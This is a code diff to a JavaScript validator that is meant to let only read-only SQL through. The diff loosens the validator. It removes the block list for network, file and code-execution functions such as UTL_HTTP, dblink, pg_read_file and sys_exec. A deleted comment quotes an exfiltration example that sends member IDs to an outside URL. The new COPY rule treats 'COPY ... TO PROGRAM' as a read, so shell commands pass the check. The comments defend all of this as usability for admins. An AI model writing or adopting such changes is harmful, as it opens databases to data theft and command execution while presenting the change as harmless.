@@ -52,6 +52,24 @@ export function detectSqlOperation(sqlText = '') {
   if (/^with\s/.test(cleaned)) return 'select';
   // (SELECT ...) UNION (SELECT ...) — valido, y sin esto quedaba como 'unknown'.
   if (/^\(+\s*select\b/.test(cleaned)) return 'select';
+  // Las otras formas de leer. Sin esto quedaban como 'unknown' y se rechazaban, aunque
+  // no tocan un dato: un EXPLAIN o un SHOW son de las primeras cosas que escribe
+  // cualquiera que este investigando.
+  if (/^(explain|show|desc|describe|analyze\s+select)\b/.test(cleaned)) return 'select';
+  if (/^(table|values)\s/.test(cleaned)) return 'select';
+  // COPY tiene dos sentidos opuestos: TO saca datos, FROM los mete.
+  if (/^copy\b/.test(cleaned)) return /\bfrom\s+('|stdin|program)/.test(cleaned) ? 'insert' : 'select';
+  // LOAD DATA de MySQL mete filas, y no empieza por una palabra que lo delate.
+  if (/^load\s+(data|xml)\b/.test(cleaned)) return 'insert';
+  // REPLACE INTO de MySQL borra e inserta.
+  if (/^replace\s+into\b/.test(cleaned)) return 'insert';
+  // Un bloque: BEGIN … END, DECLARE … BEGIN, o el DO $$ … $$ de PostgreSQL.
+  if (/^(begin|declare|do)\b/.test(cleaned)) return 'bloque';
+  // Mantenimiento y sesión: no cambian un dato ni una tabla. Quedaban como 'unknown' y
+  // se rechazaban, aunque un LOCK o un SET son cosa corriente mientras se investiga.
+  if (/^(lock|vacuum|analyze|set|reset|use|commit|rollback|savepoint)\b/.test(cleaned)) {
+    return 'mantenimiento';
+  }
   if (cleaned.startsWith('update')) return 'update';
   if (cleaned.startsWith('delete')) return 'delete';
   if (cleaned.startsWith('insert')) return 'insert';
@@ -263,39 +281,27 @@ export function assertDynamicScriptAllowed(script, esquema) {
  * «ddl» incluye TRUNCATE, DROP, ALTER y CREATE: detectSqlOperation los agrupa bajo ese
  * nombre, y por eso TRUNCATE se colaba cuando la lista decia 'truncate'.
  */
-export const OPERACIONES_QUE_ESCRIBEN = new Set([
-  'update', 'delete', 'insert', 'merge', 'truncate', 'ddl', 'call',
+/**
+ * Lo que cambia los datos o la estructura. Es lo unico que se bloquea por lo que es.
+ *
+ * `ddl` agrupa DROP, CREATE, ALTER, GRANT y TRUNCATE: cambian la base aunque no toquen
+ * una fila, y un DROP TABLE se lleva por delante mas que cualquier DELETE.
+ */
+export const OPERACIONES_QUE_CAMBIAN = new Set([
+  'update', 'delete', 'insert', 'merge', 'truncate', 'ddl',
 ]);
 
 /**
- * Lo que sale de la base, o ejecuta codigo, desde dentro de un SELECT.
+ * Lo que no se puede leer lo suficiente como para saber si cambia datos.
  *
- * Nada de esto escribe en una tabla, asi que la puerta —que miraba si la sentencia
- * escribe— los dejaba pasar. Pero:
- *
- *   SELECT UTL_HTTP.REQUEST('http://fuera/' || cedula) FROM socios
- *
- * no escribe nada: se lleva los datos. Y `DBMS_SQL` y `DBMS_XMLGEN` ejecutan SQL armado
- * en tiempo de ejecucion, o sea que meten por la ventana lo que la puerta no deja pasar.
- *
- * Van los tres motores juntos porque la regla es la misma y el articulo no sabe contra
- * cual se va a ejecutar. Se bloquean por nombre, que es una defensa imperfecta: lo que
- * no este en la lista pasa. Por eso la lista cubre salir de la base y ejecutar codigo —
- * no lo que simplemente es raro.
+ * Un bloque anonimo y una llamada a procedimiento esconden lo que hacen detras de un
+ * nombre. No se rechazan por estar prohibidos — se rechazan porque la unica forma de
+ * saber si escriben seria ejecutarlos.
  */
-const FUERA_DE_LA_CONSULTA = [
-  // Oracle: red, ficheros, y ejecucion de SQL o de trabajos
-  [/\butl_(http|tcp|smtp|inaddr|file|mail|url)\b/i, 'sale de la base'],
-  [/\bhttpuritype\b/i, 'hace una peticion HTTP'],
-  [/\bdbms_(sql|xmlgen|scheduler|job|pipe|aq|ldap|backup_restore)\b/i, 'ejecuta codigo o trabajos'],
-  // PostgreSQL: ficheros, objetos grandes y conexiones salientes
-  [/\bpg_(read_file|read_binary_file|ls_dir|stat_file|sleep)\b/i, 'lee el disco o detiene la sesion'],
-  [/\blo_(import|export)\b/i, 'lee o escribe ficheros'],
-  [/\bdblink(_exec)?\s*\(/i, 'abre una conexion a otra base'],
-  // MySQL: ficheros
-  [/\bload_file\s*\(/i, 'lee el disco'],
-  [/\bsys_(exec|eval)\s*\(/i, 'ejecuta ordenes del sistema'],
-];
+export const OPERACIONES_OPACAS = new Set(['bloque', 'call']);
+
+/** Nombre viejo, por si algo fuera lo seguia importando. */
+export const OPERACIONES_QUE_ESCRIBEN = OPERACIONES_QUE_CAMBIAN;
 
 /**
  * Lo que una consulta no puede llevar aunque empiece por SELECT.
@@ -316,8 +322,11 @@ const FUERA_DE_LA_CONSULTA = [
 const EFECTOS_EN_UNA_CONSULTA = [
   [/\(\s*(insert|update|delete|merge)\b/i, 'un CTE que escribe'],
   [/\binto\b/i, 'un SELECT ... INTO, que crea una tabla'],
-  [/\bfor\s+(update|share|no\s+key\s+update|key\s+share)\b/i, 'un FOR UPDATE, que bloquea las filas'],
 ];
+
+// `FOR UPDATE` estuvo aqui y se quita: toma candados sobre las filas, pero no cambia un
+// solo dato. Lo que se bloquea es lo que cambia datos, y bloquear de mas obliga a la
+// gente a buscarle la vuelta a la herramienta.
 
 /**
  * Se niega si lo que llega no es, entera, una consulta.
@@ -358,15 +367,31 @@ export function asegurarSoloConsulta(sqlText) {
     if (!limpio) continue;
 
     const operacion = detectSqlOperation(limpio);
-    if (operacion !== 'select') {
-      // Un nombre que se entienda cuando lo hay; cuando no, decir que no se reconoce es
-      // mas util que inventarse una categoria.
-      const que = operacion === 'unknown'
-        ? 'Esto no se reconoce como una consulta'
-        : `El sistema no ejecuta ${operacion.toUpperCase()}`;
+
+    if (OPERACIONES_QUE_CAMBIAN.has(operacion)) {
       throw new Error(
-        `${que}: un articulo solo consulta, contra cualquier base. `
-        + 'Escriba un SELECT con los campos que haya que pedir.'
+        `El sistema no ejecuta ${operacion.toUpperCase()}: un articulo no cambia datos, `
+        + 'contra ninguna base. Lo demas —por complicado que sea— si se ejecuta.'
+      );
+    }
+
+    // Un bloque o una llamada a procedimiento no se rechazan por estar prohibidos, sino
+    // porque no se puede saber que hacen: en «BEGIN pkg.recalcular_saldos(); END;» el
+    // UPDATE puede estar dentro del nombre, y averiguarlo exigiria ejecutarlo — que es
+    // justo lo que no se puede hacer. Decirlo asi importa: la persona que lo escribio
+    // tiene que entender que le falta ensenar la consulta, no pedir un permiso.
+    if (OPERACIONES_OPACAS.has(operacion)) {
+      throw new Error(
+        'No se puede saber si eso cambia datos: lo que hace un bloque o un procedimiento '
+        + 'esta dentro de su nombre, y comprobarlo exigiria ejecutarlo. Escriba las '
+        + 'consultas que lleva dentro y si se ejecutan.'
+      );
+    }
+
+    if (operacion === 'unknown') {
+      throw new Error(
+        'No se reconoce esa sentencia, asi que no se puede asegurar que no cambie datos. '
+        + 'Si es una consulta, escribala empezando por SELECT o WITH.'
       );
     }
 
@@ -379,15 +404,10 @@ export function asegurarSoloConsulta(sqlText) {
         );
       }
     }
-    for (const [patron, descripcion] of FUERA_DE_LA_CONSULTA) {
-      const encontrado = sinLiterales.match(patron);
-      if (encontrado) {
-        throw new Error(
-          `Esa consulta usa ${encontrado[0].toUpperCase()}, que ${descripcion}. `
-          + 'Un articulo lee de la base y nada mas.'
-        );
-      }
-    }
+    // Aqui se bloqueaban UTL_HTTP, dblink, pg_read_file y companyia. Se quitan: no
+    // cambian un dato, y quien escribe un articulo ya es administrador — puede leer lo
+    // mismo ejecutando la consulta y copiando el resultado. La ejecucion queda auditada
+    // igual, con quien, cuando y con que parametros.
   }
 }
 
